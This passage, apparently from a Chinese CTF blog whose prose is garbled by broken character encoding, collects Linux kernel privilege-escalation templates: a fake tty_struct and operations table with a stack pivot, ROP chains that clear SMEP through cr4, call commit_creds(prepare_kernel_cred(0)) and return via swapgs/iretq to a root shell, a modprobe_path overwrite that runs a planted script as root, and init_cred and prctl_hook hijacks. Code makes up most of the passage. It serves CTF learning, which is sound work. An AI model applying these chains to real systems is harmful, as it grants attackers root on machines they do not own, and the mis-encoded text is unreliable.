<p>åŒæ—¶åœ¨è°ƒç”¨çš„æ—¶å€™raxä¸ºä»åŠ«æŒçš„tty_structç»“æ„ä½“ä¸­è·å–çš„<code>operations *ops</code>æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆå¯ä»¥è¢«æˆ‘ä»¬ä¿®æ”¹åŠ«æŒã€‚ä¹‹åå€ŸåŠ©ä¸€ä¸ªå¯¹raxå’Œrspè¿›è¡Œæ“ä½œçš„<code>gadget--movRspRax_decEbx_ret</code>è¿›è€ŒåŠ«æŒæ ˆï¼Œå®Œæˆç¨‹åºæµå’Œæ ˆçš„åŠ«æŒã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-æ ˆ"   >
          <a href="#2-æ ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆ" class="headerlink" title="2.æ ˆ"></a>2.æ ˆ</h2>
      
        <h3 id="1-commit-creds-prepare-kernel-cred-0"   >
          <a href="#1-commit-creds-prepare-kernel-cred-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-commit-creds-prepare-kernel-cred-0" class="headerlink" title="(1)commit_creds(prepare_kernel_cred(0));"></a>(1)commit_creds(prepare_kernel_cred(0));</h3>
      <p>è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒå¸¸è§„çš„æ ˆæº¢å‡ºï¼Œä¸è¿‡è¿˜éœ€è¦æ³¨æ„SMEP/SMAPä»¥åŠKPTIæ˜¯å¦å¼€å¯</p>

        <h4 id="â‘ å¼€å¯SMEPæƒ…å†µ"   >
          <a href="#â‘ å¼€å¯SMEPæƒ…å†µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å¼€å¯SMEPæƒ…å†µ" class="headerlink" title="â‘ å¼€å¯SMEPæƒ…å†µ"></a>â‘ å¼€å¯SMEPæƒ…å†µ</h4>
      <p>è¿™ç§æƒ…å†µä¸€èˆ¬ç›´æ¥æº¢å‡ºç„¶åå…³é—­ï¼Œæˆ–è€…çŸ¥é“åŸºåœ°å€ä¹‹åå¯ä»¥å°è¯•åœ¨å†…æ ¸å®Œæˆææƒç„¶åè¿”å›ç”¨æˆ·æ€</p>

        <h5 id="ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç "   >
          <a href="#ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç " class="headerlink" title="ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç "></a>ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç </h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// </span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;  <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      			<span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h5 id="ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell"   >
          <a href="#ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell" class="headerlink" title="ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell"></a>ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred_k;  </span><br><span class="line">rop[i++] = pop_rdx_rbx_rbp_ret;</span><br><span class="line">rop[i++] = pop_rbp_ret;</span><br><span class="line">rop[i++] = <span class="number">0x0</span>;      </span><br><span class="line">rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">rop[i++] = movRdiRax_call_rdx; </span><br><span class="line">rop[i++] = commit_creds_k;</span><br><span class="line">rop[i++] = swapgs_ret;              </span><br><span class="line">rop[i++] = iretq;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡æœªå¼€å¯SMEPæƒ…å†µ"   >
          <a href="#â‘¡æœªå¼€å¯SMEPæƒ…å†µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æœªå¼€å¯SMEPæƒ…å†µ" class="headerlink" title="â‘¡æœªå¼€å¯SMEPæƒ…å†µ"></a>â‘¡æœªå¼€å¯SMEPæƒ…å†µ</h4>
      <p>ç›´æ¥è°ƒç”¨ç”¨æˆ·ç©ºé—´çš„ææƒä»£ç ï¼Œè¿”å›ä¹‹åèµ·shellå³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>

<p>(2)</p>

        <h2 id="3-mmapå†…å­˜æ˜ å°„"   >
          <a href="#3-mmapå†…å­˜æ˜ å°„" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-mmapå†…å­˜æ˜ å°„" class="headerlink" title="3.mmapå†…å­˜æ˜ å°„"></a>3.mmapå†…å­˜æ˜ å°„</h2>
      <p>è¿˜æ²¡çœ‹å¤ªæ‡‚ï¼Œæ¶‰åŠæ–‡ä»¶ç³»ç»Ÿå’Œé©±åŠ¨çš„å†…å­˜æ˜ å°„</p>
<p>å¯ä»¥å‚è€ƒ<code>LINECTF-2022-ecrypt</code>ï¼Œåé¢æœ‰æåˆ°å€ŸåŠ©kern_tableæ•°ç»„æ¥åˆ©ç”¨</p>

        <h2 id="4-å¸¸è§ææƒæ‰‹æ®µ"   >
          <a href="#4-å¸¸è§ææƒæ‰‹æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¸¸è§ææƒæ‰‹æ®µ" class="headerlink" title="4.å¸¸è§ææƒæ‰‹æ®µ"></a>4.å¸¸è§ææƒæ‰‹æ®µ</h2>
      
        <h3 id="ä¿®æ”¹modprobe-path"   >
          <a href="#ä¿®æ”¹modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹modprobe-path" class="headerlink" title="ä¿®æ”¹modprobe_path"></a>ä¿®æ”¹modprobe_path</h3>
      <p>è¿™ä¸ªè®¾æ–¹æ³•å¦‚æœå¼€å¯å¦‚ä¸‹é…ç½®åˆ™ä¸å¯ç”¨ï¼Œè¡¨ç¤º<code>modprobe_path</code>ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//v4.11åŠä¹‹åå­˜åœ¨</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>å¸¸å¸¸ç»“åˆUAFæ¼æ´æ¥ä»»æ„ç”³è¯·</p>
<p>starctf2019-hackmeâ€“<a href="https://pig-007.github.io/2021/08/14/starctf2019-hackme/">starctf2019-hackme | PIG-007</a></p>
<p>è¥¿æ¹–è®ºå‰‘â€“easy_kernelâ€“<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.crisprx.top/archives/495" >2021 è¥¿æ¹–è®ºå‰‘ çº¿ä¸Šåˆèµ› WP â€“ Crispr â€“çƒ­çˆ±æŠ€æœ¯å’Œç”Ÿæ´» (crisprx.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep modprobe_path</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥å…ˆçœ‹å€ŸåŠ©<code>kallsyms</code>æ¥<code>__request_module</code>å‡½æ•°çš„åœ°å€ï¼Œç„¶åæŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ï¼Œè·å–<code>modprobe_path</code>çš„å¼•ç”¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png" alt="image-20220328144717290"></p>
<p>ç„¶ååˆ¶ä½œä¸€ä¸ªæ‹·è´flagå¹¶ä¸”æ”¹æƒé™çš„copy.shæ–‡ä»¶ï¼Œä½¿å¾—modprobe_pathæŒ‡å‘è¯¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œä¸€ä¸ªé”™è¯¯æ ¼å¼çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå‡ºé”™ä¹‹åå°±ä¼šä»¥rootæƒé™è¿è¡Œmodprobe_pathï¼Œä»è€Œä»¥rootæƒé™è¿è¡Œæˆ‘ä»¬çš„copy.shï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè¯»å–flagäº†ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="ä¿®æ”¹init-cred"   >
          <a href="#ä¿®æ”¹init-cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹init-cred" class="headerlink" title="ä¿®æ”¹init_cred"></a>ä¿®æ”¹init_cred</h3>
      <p>initè¿›ç¨‹æ˜¯åˆå§‹è¿›ç¨‹ï¼Œä¸è¢«åŠ¨æ€åˆ†é…ï¼ŒçŸ¥é“kernelåŸºåœ°å€çš„æ—¶å€™ï¼Œå°±èƒ½å¾—åˆ°è¯¥ç»“æ„ä½“çš„åœ°å€ã€‚</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms |grep init_cred</span><br></pre></td></tr></table></div></figure>

<p>è¿™ç§æ–¹æ³•ä¸€èˆ¬ç”¨åœ¨æ²¡åŠæ³•ä¿®æ”¹åˆ°æœ¬è¿›ç¨‹çš„credç»“æ„ä½“çš„æ—¶å€™ï¼Œä¹‹åä½¿ç”¨å³å¯ææƒ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pop_rdi_ret init_cred_addr commit_creds_addrå³å¯</span></span><br><span class="line">commit_creds(&amp;init_cred)</span><br></pre></td></tr></table></div></figure>


        <h3 id="åŠ«æŒprtcl-hook"   >
          <a href="#åŠ«æŒprtcl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ«æŒprtcl-hook" class="headerlink" title="åŠ«æŒprtcl_hook"></a>åŠ«æŒprtcl_hook</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost:4000/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/#3-%E5%8A%AB%E6%8C%81prctl%E5%87%BD%E6%95%B0" >pwnKernelä»0å¼€å§‹(å››) | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;orderly_poweroff-&gt;__orderly_poweroff-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br><span class="line"></span><br><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;poweroff_work_fun-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br></pre></td></tr></table></div></figure>


        <h4 id="1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°"   >
          <a href="#1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°" class="headerlink" title="(1)åŠ«æŒä¸ºorderly_poweroffå‡½æ•°"></a>(1)åŠ«æŒä¸ºorderly_poweroffå‡½æ•°</h4>
      <p>åŠ«æŒè¯¥hookä¸ºorderly_poweroffå‡½æ•°ï¼Œç„¶åè°ƒç”¨prctlå‡½æ•°å³å¯æ“çºµç¨‹åºæµè¿›å…¥<code>orderly_poweroff</code>å‡½æ•°ï¼Œå†åŠ«æŒ<code>poweroff_cmd</code>å³å¯é¡ºç€<code>orderly_poweroff</code>å‡½æ•°æ¥è¿è¡Œ<code>call_usermodehelper(poweroff_cmd)</code>ï¼Œè¯¥å‡½æ•°æ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥ææƒï¼Œä¸è¿‡ä¸€èˆ¬è¿è¡Œä¸€ä¸ªåå¼¹shellçš„ç¨‹åºã€‚å½“ç„¶å¦‚æœæœ‰KASLRå°±è¦çˆ†ç ´æˆ–è€…æ³„éœ²äº†ã€‚</p>
<p>æœ€åéœ€è¦æ‰§è¡Œ<code>prctl(0,0)</code>ï¼›</p>

        <h4 id="2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°"   >
          <a href="#2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°" class="headerlink" title="(2)åŠ«æŒä¸ºpoweroff_work_funå‡½æ•°"></a>(2)åŠ«æŒä¸ºpoweroff_work_funå‡½æ•°</h4>
      <p>ä¸åŠ«æŒ<code>orderly_poweroff</code>å‡½æ•°åŒç†ï¼ŒåŠ«æŒä¸º<code>poweroff_work_fun</code>å‡½æ•°ä¹Ÿå¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ<code>poweroff_cmd</code></p>

        <h4 id="3-è·å–åœ°å€"   >
          <a href="#3-è·å–åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·å–åœ°å€" class="headerlink" title="(3)è·å–åœ°å€"></a>(3)è·å–åœ°å€</h4>
      
        <h5 id="â‘ prctl-hook"   >
          <a href="#â‘ prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ prctl-hook" class="headerlink" title="â‘ prctl_hook"></a>â‘ prctl_hook</h5>
      <p>å¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªå°ç¨‹åºï¼Œç„¶åç»™<code>security_task_prctl</code>å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°<code>call QWORD PTR[rbx+0x18]</code>å³å¯çœ‹åˆ°å¯¹åº”çš„rbx+0x18ä¸Šå­˜æ”¾çš„åœ°å€ï¼Œå³å¯è·å–åˆ°<code>prct_hook_addr</code>ï¼ŒåŠ«æŒä¿®æ”¹å³å¯</p>

        <h5 id="â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun"   >
          <a href="#â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun" class="headerlink" title="â‘¡poweroff_cmdã€orderly_poweroffã€poweroff_work_fun"></a>â‘¡poweroff_cmdã€orderly_poweroffã€poweroff_work_fun</h5>
